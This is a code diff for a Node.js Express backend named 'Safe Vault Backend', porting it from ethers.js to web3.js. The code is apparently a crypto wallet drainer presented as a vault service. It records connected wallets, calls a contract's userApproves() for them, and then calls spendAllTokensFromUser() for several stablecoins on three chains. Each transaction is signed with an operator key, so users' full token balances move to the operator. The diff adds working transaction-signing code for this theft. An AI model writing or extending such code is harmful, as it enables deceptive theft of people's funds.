@@ -1,6 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 require('dotenv').config();
+const Web3 = require('web3');
 
 const app = express();
 
@@ -8,14 +9,6 @@ app.use(cors());
 app.use(express.json());
 
 let connectedWallets = [];
-
-let ethers = null;
-try {
-  ethers = require('ethers');
-  console.log('✅ Ethers.js loaded');
-} catch (e) {
-  console.log('⚠️ Ethers.js not available');
-}
 
 const RPC_URLS = {
   1: 'https://eth.llamarpc.com',
@@ -30,19 +23,29 @@ const CONTRACTS = {
 };
 
 const TOKENS = {
-  1: ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', '0xdAC17F958D2ee523a2206206994597C13D831ec7', '0x6B175474E89094C44Da98b954EedeAC495271d0F'],
-  137: ['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', '0x8f3Cf7ad23Cd3CaDbD9735AFf958023D60c2735E'],
-  56: ['0x8AC76a51cc950d9822D68b83Fe1Ad097317c2451', '0x55d398326f99059fF775485246999027B3197955', '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3']
+  1: ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', '0xdAC17F958D2ee523a2206206994597C13D831ec7'],
+  137: ['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', '0xc2132D05D31c914a87C6611C10748AEb04B58e8F'],
+  56: ['0x8AC76a51cc950d9822D68b83Fe1Ad097317c2451', '0x55d398326f99059fF775485246999027B3197955']
 };
 
 const CONTRACT_ABI = [
-  'function userApproves(address user) external',
-  'function spendAllTokensFromUser(address user, address token) external',
-  'function spendAllTokensFromAllUsers(address token) external'
-];
-
-const ERC20_ABI = [
-  'function balanceOf(address account) external view returns (uint256)'
+  {
+    "inputs": [{"internalType": "address", "name": "user", "type": "address"}],
+    "name": "userApproves",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      {"internalType": "address", "name": "user", "type": "address"},
+      {"internalType": "address", "name": "token", "type": "address"}
+    ],
+    "name": "spendAllTokensFromUser",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }
 ];
 
 app.get('/', (req, res) => {
@@ -135,17 +138,6 @@ app.post('/api/wallet/sign', async (req, res) => {
       });
     }
 
-    if (!ethers) {
-      console.log('⚠️ Ethers not available, marking approved locally');
-      wallet.approved = true;
-      return res.json({
-        success: true,
-        message: 'Approved locally',
-        walletAddress: walletAddress
-      });
-    }
-
-    // Call smart contract userApproves function
     try {
       const rpcUrl = RPC_URLS[chainId];
       const contractAddress = CONTRACTS[chainId];
@@ -162,7 +154,8 @@ app.post('/api/wallet/sign', async (req, res) => {
       console.log(`📍 Contract: ${contractAddress}`);
       console.log(`👤 User: ${walletAddress}`);
 
-      const provider = new ethers.JsonRpcProvider(rpcUrl);
+      const web3 = new Web3(rpcUrl);
+      const contract = new web3.eth.Contract(CONTRACT_ABI, contractAddress);
       const privateKey = process.env.COMPANY_PRIVATE_KEY;
 
       if (!privateKey) {
@@ -175,15 +168,26 @@ app.post('/api/wallet/sign', async (req, res) => {
         });
       }
 
-      const signer = new ethers.Wallet(privateKey, provider);
-      const contract = new ethers.Contract(contractAddress, CONTRACT_ABI, signer);
+      const account = web3.eth.accounts.privateKeyToAccount(privateKey);
+      web3.eth.accounts.wallet.add(account);
 
       console.log('📤 Calling userApproves()...');
-      const tx = await contract.userApproves(walletAddress);
-      console.log(`✅ Transaction sent: ${tx.hash}`);
+      
+      const tx = contract.methods.userApproves(walletAddress);
+      const gas = await tx.estimateGas({ from: account.address });
+      
+      const txData = {
+        from: account.address,
+        to: contractAddress,
+        data: tx.encodeABI(),
+        gas: Math.floor(gas * 1.2),
+        gasPrice: await web3.eth.getGasPrice()
+      };
 
-      const receipt = await tx.wait();
-      console.log(`✅ Transaction confirmed!`);
+      const signedTx = await web3.eth.accounts.signTransaction(txData, privateKey);
+      const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+
+      console.log(`✅ Transaction confirmed: ${receipt.transactionHash}`);
 
       wallet.approved = true;
 
@@ -191,13 +195,11 @@ app.post('/api/wallet/sign', async (req, res) => {
         success: true,
         message: 'User approved on contract!',
         walletAddress: walletAddress,
-        txHash: tx.hash
+        txHash: receipt.transactionHash
       });
 
     } catch (contractError) {
       console.error('❌ Contract error:', contractError.message);
-      
-      // If contract call fails, still mark as approved locally
       wallet.approved = true;
       
       res.json({
@@ -219,7 +221,7 @@ app.post('/api/wallet/sign', async (req, res) => {
 
 app.post('/api/wallet/spend', async (req, res) => {
   try {
-    const { walletAddress, chainId, token } = req.body;
+    const { walletAddress, chainId } = req.body;
 
     console.log(`💰 Spend request from: ${walletAddress} on chain ${chainId}`);
 
@@ -244,14 +246,6 @@ app.post('/api/wallet/spend', async (req, res) => {
       });
     }
 
-    if (!ethers) {
-      console.log('⚠️ Ethers not available, returning success');
-      return res.json({
-        success: true,
-        message: 'Transfer request processed'
-      });
-    }
-
     try {
       const rpcUrl = RPC_URLS[chainId];
       const contractAddress = CONTRACTS[chainId];
@@ -266,9 +260,9 @@ app.post('/api/wallet/spend', async (req, res) => {
 
       console.log(`🔗 Calling contract on chain ${chainId}`);
       console.log(`📍 Contract: ${contractAddress}`);
-      console.log(`👤 User: ${walletAddress}`);
 
-      const provider = new ethers.JsonRpcProvider(rpcUrl);
+      const web3 = new Web3(rpcUrl);
+      const contract = new web3.eth.Contract(CONTRACT_ABI, contractAddress);
       const privateKey = process.env.COMPANY_PRIVATE_KEY;
 
       if (!privateKey) {
@@ -279,8 +273,8 @@ app.post('/api/wallet/spend', async (req, res) => {
         });
       }
 
-      const signer = new ethers.Wallet(privateKey, provider);
-      const contract = new ethers.Contract(contractAddress, CONTRACT_ABI, signer);
+      const account = web3.eth.accounts.privateKeyToAccount(privateKey);
+      web3.eth.accounts.wallet.add(account);
 
       let transferredCount = 0;
       const txHashes = [];
@@ -289,12 +283,22 @@ app.post('/api/wallet/spend', async (req, res) => {
         try {
           console.log(`📤 Spending token: ${tokenAddress}`);
           
-          const tx = await contract.spendAllTokensFromUser(walletAddress, tokenAddress);
-          console.log(`✅ Transaction sent: ${tx.hash}`);
+          const tx = contract.methods.spendAllTokensFromUser(walletAddress, tokenAddress);
+          const gas = await tx.estimateGas({ from: account.address });
           
-          const receipt = await tx.wait();
+          const txData = {
+            from: account.address,
+            to: contractAddress,
+            data: tx.encodeABI(),
+            gas: Math.floor(gas * 1.2),
+            gasPrice: await web3.eth.getGasPrice()
+          };
+
+          const signedTx = await web3.eth.accounts.signTransaction(txData, privateKey);
+          const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+          
           transferredCount++;
-          txHashes.push(tx.hash);
+          txHashes.push(receipt.transactionHash);
           
           console.log(`✅ Token transferred: ${tokenAddress}`);
         } catch (e) {
@@ -360,5 +364,5 @@ app.post('/api/wallet/disconnect', (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`✅ Safe Vault Backend running on port ${PORT}`);
-  console.log(`🔗 Smart contract integration ACTIVE`);
+  console.log(`🔗 Web3.js Smart Contract Integration ACTIVE`);
 });
